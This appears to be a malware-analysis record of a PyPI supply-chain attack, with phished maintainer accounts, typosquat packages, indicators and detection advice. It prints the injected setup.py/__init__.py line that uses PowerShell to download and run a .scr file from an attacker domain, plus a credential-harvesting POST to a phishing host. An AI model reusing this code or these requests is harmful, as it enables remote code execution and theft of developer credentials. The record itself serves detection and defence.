package_info.package_versions: exotel==0.1.6, spam==2.0.2, spam==4.0.2, several hundred others (unspecified)
package_info.why_malicious: These packages were either compromised via account takeover (following a phishing campaign) or created as typosquats, and were modified to include code that downloads and executes a Windows executable from attacker-controlled infrastructure, enabling remote code execution and likely credential theft. The attack chain involves phishing PyPI maintainers, stealing credentials, and injecting malicious code into packages to compromise downstream users.

execution_context.file_location: setup.py or __init__.py of compromised or typosquat package

malicious_snippets.code_snippet:
import os
os.system('powershell -Command "Invoke-WebRequest -Uri https://python-release.com/python-install.scr -OutFile python-install.scr; Start-Process python-install.scr"')
malicious_snippets.code_behavior: At install-time or import-time, the code executes a shell command that downloads a Windows executable (.scr) from https://python-release.com and immediately runs it, resulting in remote code execution and potential credential theft.

malice_analysis.why_suspicious: The code initiates a network request to download and execute a Windows binary from an untrusted, attacker-controlled domain during package installation or import, which is highly abnormal and dangerous.
malice_analysis.violated_expectations: Legitimate Python packages should never download and execute external binaries from non-official sources without explicit user consent, especially during installation or import.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies or binaries, but only from official, trusted sources (such as PyPI or vendor CDNs) and typically with user awareness or opt-in.
key_indicators: Use of os.system to execute shell commands in setup.py or __init__.py
Download of .scr (Windows executable) from non-PyPI, attacker-controlled domain
Immediate execution of the downloaded file via Start-Process

execution_context.trigger: At runtime (when a victim submits credentials to the phishing site)
execution_context.file_location: Server-side code of fake PyPI login page (attack infrastructure, not in package)

malicious_snippets.code_snippet:
POST /pyp/resp.php?live=Installation HTTP/1.1
Host: linkedopports.com
Content-Type: application/x-www-form-urlencoded

username=...&password=...
malicious_snippets.code_behavior: At runtime, when a victim submits credentials to the phishing site, the backend code receives the credentials via HTTP POST and forwards them to the attacker's server at linkedopports.com, enabling credential exfiltration.

malice_analysis.why_suspicious: The backend is designed to collect and exfiltrate PyPI credentials from a fake login page to an attacker-controlled domain, which is a clear indicator of phishing.
malice_analysis.violated_expectations: A legitimate PyPI login page would only send credentials to official PyPI infrastructure, never to unrelated or third-party domains.
malice_analysis.similar_legitimate_use: Legitimate login forms transmit credentials to their own backend for authentication, not to external or unrelated domains.
key_indicators: Credential POST requests to unrelated, attacker-controlled domain
Use of /pyp/resp.php endpoint for credential collection
Domain linkedopports.com not associated with PyPI or Python Software Foundation

attack_chain.action: Phishing email sent to PyPI contributors, luring them to a fake login page.
Stolen credentials used to access and modify legitimate PyPI packages or upload new typosquat packages.
Malicious code in compromised or typosquat packages executes on victim systems, downloading and running remote malware.
attack_chain.leads_to: Remote code execution and potential further compromise

behavioral_signatures: Package installation or import triggers download and execution of remote Windows executables (.scr files)
Presence of os.system or subprocess calls in setup.py or __init__.py that invoke PowerShell or download external binaries
Network requests to non-PyPI domains (e.g., python-release.com, ledgdown.com) during install or import
Credential POST requests from web forms to domains not associated with PyPI
file_indicators: setup.py or __init__.py containing os.system or subprocess calls that download .scr files
Presence of python-install.scr or LedgerSetup.scr in user directories after package installation
References to python-release.com or ledgdown.com in package source code
network_indicators: Outbound connections to python-release.com, ledgdown.com, or linkedopports.com
HTTP POST requests to /pyp/resp.php?live=Installation on linkedopports.com
detection_knowledge.how_to_detect: Monitor for PyPI package installations or imports that initiate network requests to non-standard domains, especially those downloading and executing .scr files. Scan package source code for os.system or subprocess calls that fetch and run external binaries. Flag any credential POSTs from web forms to domains not associated with PyPI. Alert on the presence of python-install.scr, LedgerSetup.scr, or references to python-release.com, ledgdown.com, or linkedopports.com in code or network logs. Correlate package installation events with subsequent process execution of downloaded files.
